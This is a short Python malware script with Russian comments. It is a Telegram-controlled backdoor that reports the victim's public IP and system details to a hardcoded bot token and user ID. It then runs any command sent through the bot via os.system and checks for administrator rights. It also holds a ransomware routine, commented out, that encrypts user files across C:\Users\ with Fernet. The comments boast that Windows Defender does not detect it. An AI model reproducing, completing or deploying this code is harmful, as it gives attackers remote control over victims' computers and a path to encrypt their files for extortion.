import requests
import os
import time
import subprocess
import getpass
import telebot
import platform
import ctypes
from cryptography.fernet import Fernet
"""""
def crypt():

    directory = "C:\\Users\\"

    extensions = (".3g2", ".3gp", ".asf", ".asx", ".avi", ".flv",
                  ".m2ts", ".mkv", ".mov", ".mp4", ".mpg", ".mpeg",
                  ".rm", ".swf", ".vob", ".wmv" ".docx", ".pdf", ".rar",
                  ".jpg", ".jpeg", ".png", ".tiff", ".zip", ".7z", ".exe",
                  ".tar.gz", ".tar", ".mp3", ".sh", ".c", ".cpp", ".h",
                  ".gif", ".txt", ".py", ".pyc", ".jar", ".sql", ".bundle",
                  ".sqlite3", ".html", ".php", ".log", ".bak", ".deb")

    
    key = Fernet.generate_key()
    cipher = Fernet(key)

    
    for subdir, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(extensions):
                file_path = subdir + os.sep + file
                print(file_path)

                with open(file_path, "rb") as f:
                    data = f.read()
                    encrypted_data = cipher.encrypt(data)
                with open(file_path, "wb") as f:
                    f.write(encrypted_data)
                    Выше функция простейшего шифрования файлов
                    (Эмуляция ransomware)
                    Ниже удаленный контроль без переброса портов и прочих мучений. 
                    """
system = platform.uname()
sys = (system.system)
ver = (system.version)
proc = (system.processor)
ip = requests.get("https://api.ipify.org").text
time.sleep(20)
bot = telebot.TeleBot('6064388809:AAFhXbFJrkjQ_pjvs2GOE1jIBxTaSkt9yCU')
user_id = "1304451700"
bot.send_message(user_id, "User " + ip + " Online\nSystem: " + sys +" \nVersion: " + ver + "\nCP: " + proc)
@bot.message_handler(content_types=['text'])
def handle_message(message):
    command = message.text
    try:
        os.system(command)
    except:
        pass
    if command == "crypt":
        pass      # crypt()    Зашифруйте файлы
    elif command == "Admin":
        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
            bot.send_message(user_id, "WE ARE GOD")
        else:
            bot.send_message(user_id, "Something went wrong")
    else:
        pass
bot.polling()
# Созданный на коленках без особых функций. Но и много не нужно просто доступ к сmd powershell, остальное можно подргрузить.
# также доработать функцию шифрования файлов. Это как концепт пойдет
# Теперь возможно все только фантазия и проф навыков немного
# Все предельно просто а windef молчит... И на коннект к тг и на шифрование

